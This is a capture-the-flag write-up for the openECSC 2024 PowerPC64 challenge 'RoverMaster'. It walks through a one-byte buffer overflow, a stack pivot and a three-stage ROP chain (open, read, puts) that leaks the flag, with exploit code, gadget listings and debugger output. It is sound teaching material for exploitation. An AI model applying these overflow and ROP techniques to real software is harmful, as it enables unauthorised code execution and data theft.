Author: 0x6fe1be2

Version 27-03-24

# [openECSC](https://open.ecsc2024.it) (18.03-24.03)

## 🪐RoverMaster🪐

Status: first blooded 🩸 (0x6fe1be2)

Category: PWN

Points: 255 (10 Solves)

### TL;DR

🪐RoverMaster🪐 is a PowerPC64 (PPC64) pwn challenge with a one byte buffer overflow (BOF) vulnerability that can be abused to pivot the stack and build a ROP-chain. The hardest part of the challenge was understanding the PowerPC64 architecture and it's unique ROP Gadgets. 

### Intro

🪐RoverMaster🪐 is a PowerPC64 (PPC64) pwn challenge from the first round of openECSC 2024.

Description:

> 🪐 I'm giving you the keys for the art of mastering rovers... 🪐
>
> You can download the challenge files [here](https://cloud.cybersecnatlab.it/s/Po7sJdYCDdtwLjy).
>
> ```bash
> nc rovermaster.challs.open.ecsc2024.it 38007
> ```

the challenge files consist of a tar.gz archive that we extract to get the following files:

```
rovermaster/README.md
# deployment files for service
rovermaster/host/flag/
rovermaster/host/flag/.env 
rovermaster/host/docker-compose.yml
rovermaster/host/Dockerfile
rovermaster/host/run.sh
# qemu ppc64 cloud-image
rovermaster/host/debian-12-generic-ppc64el-20240211-1654.qcow2.ready
```



### Files

First of all we follow the instructions from the *README.md* to mount the file system locally and append our public key

```bash
sudo modprobe nbd max_part=8
sudo qemu-nbd --connect=/dev/nbd0 debian-12-generic-ppc64el-20240211-1654.qcow2.ready
mkdir ./mnt
sudo mount /dev/nbd0p1 ./mnt
echo "PUBLIC_KEY" | sudo tee -a ./mnt/root/.ssh/authorized_keys
sudo umount ./mnt
sudo qemu-nbd --disconnect /dev/nbd0
sudo rmmod nbd
```

>  Note: On my system I needed to modify the *run.sh* script to use `qemu-system-ppc64` instead of `qemu-system-ppc64le`.

we can now start the vm by executing *run.sh* and ssh to it using `ssh root@localhost -p 2222 -i $PATH_TO_KEYFILE`.

The first thing we will do is extract the binary `/root/powerpc/main` in order to reverse it, and look at some meta data.

```
> scp -P 2222 -i $PATH_TO_KEYFILE root@localhost:/root/powerpc/main ./main

> file ./main
./main: ELF 64-bit LSB executable, 64-bit PowerPC or cisco 7500, OpenPOWER ELF V2 ABI, version 1 (GNU/Linux), statically linked, BuildID[sha1]=497ee6f8ded126b012877d8d2cbdade822a8d0a5, for GNU/Linux 3.10.0, not stripped

> vagd info ./main
[*] './main'
    Arch:     powerpc64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x10000000)
[*] GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0
```

The binary is static and non stripped, also no PIE so we won't need to find a leak for the exploit.

### Debug Environment

In order to create a debug environment we will be using the following tools and the provided vm.

* [GEF](https://github.com/hugsy/gef) (gdb plugin that supports PPC64)
* [vagd](https://github.com/gfelber/vagd) (my open source pwntools "plugin" I wrote for cross Distro / Kernel / Architecture binary exploitation)
* gdbserver (needs to be installed on the VM)

> Note: vagd probably was a huge contributor to me achieving first blood on this challenge

We create an exploit template for SSH in *exploit.py* using `vagd`

```bash
vagd template ./main rovermaster.challs.open.ecsc2024.it 38007 -e --ssh
```

And update it for our remote machine

```diff
70c70
<     vm = Shgd(exe.path, user='user', host='localhost', port=22, ex=True, fast=True)  # SSH
---
>     vm = Shgd(exe.path, user='root', host='localhost', port=2222, keyfile='PATH_TO_KEYFILE', ex=True, fast=True)  # SSH
```

After executing the script `./exploit.py`, we get prompted with the binary REPL.

Sadly pwntools uses `gdb` to find the correct binary so we modify the `PATH` to make `gdb` point to `ppc64le-elf-gdb` instead

```bash
ln -s /usr/bin/ppc64le-elf-gdb gdb
```

Now we can attach gdb to our binary for debugging and exploitation

```bash
PATH="$PWD:$PATH" ./exploit.py GDB
```

### Reversing (Ghidra)

Ghidra requires the user to choose the right archtecture for the binary, `Power ISA 3.0 Little Endian w/Altivec` worked best for me. Another notable gimmick is that for some reason Ghidra detects `func` and `.func` versions of the same function, whereas the `func` version executes a few instructions more, but this is more of an inconvenience than issue. 

### Code
#### Reversed Code: 

[*rovermaster.c*](https://gfelber.dev/writeups/rovermaster/rovermaster.c)

There is one obvious vulnerability in this code `read_exactly` overflows the read buffer by one. This allows us to overflow the `rover.name` buffer into the `rover.code`  function pointer inside `cmd_set_name` which can be used to get limited arbitrary code execution:

```c
long long read_exactly(int fd, char *buf, size_t size)
{
  unsigned long long i = 0;
  size_t var;
  // BOF by 1
  do {
    if (size < i)
      return 0;
    var = read(fd,buf + i,1);
    if (var < 1)
      return -1;
    i = i + var;
  } while( true );
}
```



### BOF Vulnerability

First let's define some helper functions that allow us to interact with the code:

[*helpers.py*](https://gfelber.dev/writeups/rovermaster/helpers.py)

> Note: I use a lot of alias functions (`sla() -> t.sendlineafter()`), if you want the full list look at the start of the final exploit or generate a template using `vagd template`

Now we can try out the one byte BOF to get arbitrary code execution, i.e. by overwriting the `rover.code` function pointer into immediately returning

```python
t = get_target()

joke('BOF? Boffa theese ...')

choose(0)

# create bof
linfo('one byte BOF')
bof = flat(
  cyclic(0x100),
  p8(0x74) # blr -> immediatly return
)

set_name(bof, oob=True)
# arbitary code execution
exc()

it()
```

> Note: Please routinely check if your exploit code works on the remote server.

And it works, so what next? Luckily (or by design) there is this gadget within one byte of our address:

```assembly
10000e64 a0 00 3f 38     addi       r1,r31,0xa0   ; r1  = r31+0xa0
10000e68 10 00 01 e8     ld         r0,0x10(r1)   ; r0  = *(r1+0x10)
10000e6c a6 03 08 7c     mtspr      LR,r0         ; lr  = r0
10000e70 f8 ff e1 eb     ld         r31,0x8(r1)   ; r31 = *(r1+0x8)
10000e74 20 00 80 4e     blr                      ; branch to lr
...
; cmd_set_name()
10000e84 11 10 40 3c     lis        r2,0x1011

```

Even luckier this pivots the stack to the buffer allocated for our funny joke;

```python

linfo('write rop payload for later')
PAYLOAD_START = 0x10110116
rop = flat(
  0x6fe1be2, # r31
  cyclic(0x10),
  exe.sym.main, # ctr
)
joke(rop)
t = get_target()

# choose last rover for the bof vulnerability
choose(0xe)

linfo('one byte BOF')
bof = flat(
  cyclic(0x100),
  p8(0x64)   
)
set_name(bof, oob=True)

exc()

it()
```



### ROP in PPC64

Before we can start ROPing to victory, we must understand the registers and instructions used in PPC64, these are mostly taken from this [CheatSheet](https://zenith.nsmbu.net/wiki/Custom_Code/PowerPC_Assembly_Cheatsheet)

#### Registers

|                           Register                           | Name                                           | Attributes              | Bits | Purpose                                                      |
| :----------------------------------------------------------: | ---------------------------------------------- | ----------------------- | ---- | ------------------------------------------------------------ |
|                                                              |                                                |                         |      | **General Purpose Registers (GPRs)**                         |
|                              r0                              | GPR0                                           | Volatile + Cross-Module | 64   | General purpose, may be used by function linkage (Linux System Call number) |
|                            **r1**                            | GPR1                                           | Saved + Reserved        | 64   | Reserved for storing the stack frame pointer                 |
|                              r2                              | GPR2                                           | Reserved                | 64   | Reserved for usage by the system                             |
|                            **r3**                            | GPR3                                           | Volatile                | 64   | Stores 1st argument passed to function calls and their return value (Same for Linux System Call) |
|                         **r4 - r10**                         | GPR4 - GPR10                                   | Volatile                | 64   | Store from 2nd to 8th argument passed to function calls (Same for Linux System Call) |
|                          r11 - r12                           | GPR11 - GPR12                                  | Volatile + Cross-Module | 64   | General purpose, may be used by function linkage             |
|                             r13                              | GPR13                                          | Reserved                | 64   | Reserved for storing the small data area (SDA) pointer       |
|                          r14 - r30                           | GPR14 - GPR30                                  | Saved                   | 64   | General purpose, store generic integer values and pointers   |
|                           **r31**                            | GPR31                                          | Saved                   | 64   | Commonly used as stack base pointer                          |
|                                                              |                                                |                         |      | **Special Purpose Registers (SPRs)**                         |
|                           PC / IAR                           | Program Counter / Instruction Address Register | Internal                | 64   | Stores the address of the current instruction (Controlled by the CPU) |
|                              LR                              | Link Register                                  | Volatile                | 64   | Stores the return address for some of the branching instructions |
|                             CTR                              | CounT Register                                 | Volatile                | 64   | Stores the counter of loop iterations for most instructions  that perform loops. Also used for virtual function calls as it can  contain an address which can be branched to |
|                             MSR                              | Machine State Register                         | Special                 | 64   | Stores bits with information about the CPU and its current state |
| CR | Condition Register                             | Volatile / Saved        | 64   | Divided in 8 bitfields of 4 bits each to hold different kinds of conditions |

#### Instructions

Some of the instructions used in our gadgets:

| Instruction | Name                              | Parameters     | Pseudocode Equivalent | Additional Info                                              |
| ----------- | --------------------------------- | -------------- | --------------------- | ------------------------------------------------------------ |
|             |                                   |                |                       | **Integer Arithmetic Instructions**                          |
| `addi`      | ADD Immediate                     | `rA, rB, iX₁₆` | `rA = rB + iX`        | Adds the values of rB and iX together and stores the result in rA |
|             |                                   |                |                       | **Integer Comparison Instructions**                          |
| `or`        | OR operation                      | `rA, rB, rC`   | `rA = rB \| rC`        | Stores in rA the result of (rB \| rC)                        |
|             |                                   |                |                       | **Branch Instructions**                                      |
| `blr`       | Branch to Link Register           | *N/A*          | `return <r3 / f1>`    | Jumps from the current address to the address stored in LR This is essentially the **return** statement of a function, with  the value currently loaded into either r3 or f1 holding the returned  value, depending on if the return type is a fixed or floating point  value |
| `bctrl`     | Branch to CounT Register and Link |                |                       |                                                              |
|             |                                   |                |                       | **Move to/from Special Purpose Registers Instructions**      |
| `mtctr`     | Move To CounT Register            | `rA`           | `CTR = rA`            | Copies the value of rA into the CTR                          |
| `mtspr`     | Move To Special Purpose Register  | `SPR, rA`      | `SPRs[SPR] = rA`      | Copies the value of rA into the special purpose register SPR |
|             |                                   |                |                       | **Uncategorized instructions (categories WIP)**              |
| `ld`        | Load Doubleword                   | `rA, iX₁₆(rB)` | `rA = *(rB + iX)`     | Loads the value at the address (rB + iX) into rA.            |
|             |                                   |                |                       | **Misc. Instructions**                                       |
| `sc`        | System Call                       | `[iX₇]`        | *N/A*                 | Calls upon the system to perform a service identified by iX If iX is not provided, triggers a system call exception. |



#### Pivot

First we will need someway to execute a ROP chain that is longer than one instruction. We achieve this by pivoting the stack ptr (`r1`) into a user controlled section in memory. The global variable buffer used by the rover struct array `rovers` is a perfect target for a pivot.

Let's dump some gadgets:

```bash
ROPgadget --binary ./main > gadgets.txt
```

An we get this useful pivot gadget:

pivot gadget

```assembly
10000cf8 80 00 3f 38     addi       r1,r31,0x80  ; r1  = r31+0x80
10000cfc 10 00 01 e8     ld         r0,0x10(r1)  ; r0  = *(r1+0x10)
10000d00 a6 03 08 7c     mtspr      LR,r0	 ; lr  = r0
10000d04 f8 ff e1 eb     ld         r31,0x8(r1)  ; r31 = *(r1+0x8)
10000d08 20 00 80 4e     blr                     ; branch to lr
```

which we use to pivot to our user controlled global buffer:

```python
linfo('write rop payload for later')
# global buffer that contains the rover struct array
ROVERS = 0x10110110
# start of planet buffer of first rover
PAYLOAD_START = ROVERS+6 
pivot = flat(
  PAYLOAD_START-0x78, # r31
  cyclic(0x10),
  0x10000cf8, # ctr
)
joke(pivot)

linfo('prepare payload')
choose(0)
payload = cyc(0x100)
set_planet(payload)
```

and it works allowing us to write a payload into the rover global variable buffers:

```
$r0  : 0x6161616861616167 ("gaaahaaa"?)
$r1  : 0x000000001011011e  →  "caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoa[...]"
...
$r12 : 0x0000000010000e64  →  <cmd_set_planet+204> addi r1, r31, 160
...
$r31 : 0x6161616261616161 ("aaaabaaa"?)
$pc  : 0x6161616861616164 ("daaahaaa"?)
$cr  : [negative[0] positive[0] equal[0] overflow[0] less[7] greater[7] EQUAL[7] overflow[7]]
$lr  : 0x6161616861616167 ("gaaahaaa"?)
$ctr : 0x0000000010000e64  →  <cmd_set_planet+204> addi r1, r31, 160
─── stack ────
0x000000001011011e│+0x0000: "caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoa[...]"    ← $r1
0x0000000010110126│+0x0008: "eaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqa[...]"
0x000000001011012e│+0x0010: "gaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasa[...]"
```



#### Payload

Before starting to write our payload we will create a helper functions that correctly writes our payload across multiple buffers.

```python
payload = flat(
  PAYLOAD_START, # r31
  cyc(0x10),
  0x6fe1be2, # execute this
)

rop_size = (len(payload)//0x100) + 1

payload += cyclic((0x100*rop_size)-len(payload))

assert len(payload) <= 0x1e00, 'payload to long'

lhex(rop_size, 'rop_size: ')

p = lprog('prepare payload')
for i in range(0, rop_size):
  p.status(f'{i}/{rop_size}')
  if i & 1 == 0:
    choose(i//2)
    set_planet(payload[i*0x100:(i + 1)*0x100])
  else:
    set_name(payload[i*0x100:(i + 1)*0x100])

p.success('start payload')

```

Now we can start with writing our ROP payload. If we look at the seccomp filters in the `init()` function at the start of `main()` we remember that only the `openat`, `read`, `wriite` and `clock_nanosleep` syscalls are allowed, limiting what payload can be created. Notable we will need to write a `openat -> read -> write` payload, so let's get started.

#### 1. Stage openat

In our first stage we will open our target file (in this case `./flag`), this translate to the following function call `open('./flag', O_RDONLY)` (`open` uses the `openat` syscall, not `open`), which means we will need control over the registers `r3` (first argument) and `r4` (second argument). 

For this we will use the following gadget:

```assembly
10022174 28 00 81 e8     ld         r4, 0x18(r1) ; r4  = *(r1+0x18)
10022178 20 00 61 e8     ld         r3, 0x20(r1) ; r3  = *(r1+0x20)
1002217c a6 03 89 7d     mtspr      CTR,r12      ; ctr = r12
10022180 21 04 80 4e     bctrl                   ; branch to ctr and set lr
```

So this gadgets basically makes us jump to r12, but we never set r12, so where do we jump?

Actually r12 is still set to our `rover.code` function from earlier, so we basically jump to our old stack pivot gadget used in the one byte BOF.

```assembly
; opt_execute_cmd
...
1000159c a6 03 89 7d     mtspr      CTR,r12 ; ctr = r12
100015a0 21 04 80 4e     bctrl              ; branch to ctr and set lr
```

Using these gadgets we can complete our first stage and open the flag to fd `3`

```python
# first stage open('flag', O_RDONLY)
payload = flat(
  PAYLOAD_START, # r31
  pad(b'./flag\0', 0x10), # file to open
  0x10022174, # set r3 r4
  cto('caaa'),
  PAYLOAD_START+8, #r3 (path)
  cyc(cfd('eaaa')-(cfd('caaa')+8)),
  0, #r4 (O_RDONLY)
  cyc(cfd('laab')-(cfd('eaaa')+8)),
  exe.sym.open+0x18 # skip prologue
)
```

You may notice that we don't use `exe.sym.open` but `exe.sym.open+0x18` instead. This is because the prologue and epilogue of the function actually create an infinite loop, because the function tries to return to `lr`, but `lr` points to the our gadget making us loop.

> Note: we don't directly jump to open using `ctr` but jump to `0x10000e64` set in `r12`, in this gadget we pivot using `lr`, therefore we loop.

#### 2.Stage read

The second stage definitely is the hardest one. Our goal is the recreate the following function call `read(FLAG_FD, BUFFER, count)`. So we will need control over the registers `r3-r5`.

We already have a gadget for `r3-r4`, but how will we set `r5`?

Well there is this on gadget that set's r5 to a sufficiently high value, but it doesn't immediately return, but creates an infinite loop instead (until SEGFAULT).

```assembly
100b2fb0 79 43 a5 7c     or.        r5,r5,r8   ; r5 = r5 | r8
; a bunch more code but returns to rl
```

So how do we fix this issue. If we remember the previous stage, we had a similar issue calling `exe.sym.open`. And if we look at the code execution we notice that the same issue occurs here, notable looping back to `lr`. So how can we circumvent this?

Previously we used this to set our registers `r3` and `r4`, but there is actually and insanely powerful instruction preceding our gadget (which wasn't even found by `ROPgadget`), `ld r12,0x18(r31)`:

```assembly
10022170 18 00 9f e9     ld         r12,0x18(r31) ; r12 = *(r31+0x18)
10022174 28 00 81 e8     ld         r4, 0x18(r1)  ; r4  = *(r1+0x18)
10022178 20 00 61 e8     ld         r3, 0x20(r1)  ; r3  = *(r1+0x20)
1002217c a6 03 89 7d     mtspr      CTR,r12       ; ctr = r12
10022180 21 04 80 4e     bctrl                    ; branch to ctr and set lr

; after blr in gadget
10022184 18 00 41 e8     ld         r2,0x28(r1)   ; r2  = *(r1+0x28)
10022188 40 00 21 38     addi       r1,r1,0x40    ; r1  = r1+0x40
1002218c 10 00 01 e8     ld         r0,0x10(r1)   ; r0  = *(r1+0x10)
10022190 f8 ff e1 eb     ld         r31,0x8(r1)   ; r31 = *(r1+0x8)
10022194 a6 03 08 7c     mtspr      LR,r0         ; lr  = r0
10022198 20 00 80 4e     blr                      ; branch to lr

```

This basically allows us to execute the `or. r5,r5,r8` gadget using the `ctr` register and then afterwards branching back to our previous gadget set in `rl`. Using this we can set the remaining registers `r3` and `r4` and read the flag into a known buffer. 

```python
# second stage read(3, BUFFER, count)
payload += flat(
  cto('iaaa'),
  PAYLOAD_START+len(payload)+0x80, # r31
  cto('eaaa'),
  0x10022170, # use ctr for branch (preserve lr)
  cto('waaa'),
  0x100b2fb0, # set r5 to high value (count)
  PAYLOAD_START+len(payload)+0x100, # r31
  cto('eaaa'),
  0x10022170, # set r3 r4 
  cto('caaa'),
  3, #r3 (flag fd)
  cyc(cfd('eaaa')-(cfd('caaa')+8)),
  PAYLOAD_START+0xf400, #r4 (buffer)
  cto('caaa'),
  PAYLOAD_START+len(payload)+0x180, # r31
  cyc(cfd('haaa')-(cfd('caaa')+4)),
  0x10000cf0,  # pivot stack 
  cyc(0x40-(cfd('haaa')+0xc)),
  exe.sym.read
)
```

> Note: because we directly jump to `read` using `bctrl` we don't need to skip prologue this time, because `rl` is set to the instruction after `bctrl`

#### 3.Stage puts

Lastly we will need to print out the flag, by calling the function `puts(BUFFER)`. This is easily done using our previous gadgets.

```python
# third stage puts(BUFFER)
payload += flat(
  cto('acba'),
  PAYLOAD_START+len(payload)+0x100, # r31
  cyc(cfd('acha')-(cfd('acba')+8)),
  0x10022170, # set r3 r4 again
  cto('caaa'),
  PAYLOAD_START+0xf400, #r3
  cyc(cfd('eaaa')-(cfd('caaa')+8)),
  0x6fe1be2, #r4
  cto('caaa'),
  exe.sym.puts
)
```

> Note: Initially i tried to leak the flag using `write(STDOUT_FILENO, BUFFER, count)`, but apparently `socaz` and `socat` won't allow this (this seems to happen because `count` is set way to high), even though it works locally, this seems to be a reoccurring issue with pwn challenges and i still have no idea why it happens.
### Exploit

Combining all three stages finishes our exploit and prints us the flag: `openECSC{r0pping_on_th3_rovers_l1ke_th3res_n0_t0morr0w_efb67db3}`

#### Full Exploit:

[*exploit.py*](https://gfelber.dev/writeups/rovermaster/exploit.py)

> Note: If you don't want to install vagd you can run the exploit locally (inside the vm) using the arguments `LOCAL` or only on the remote using `REMOTE`
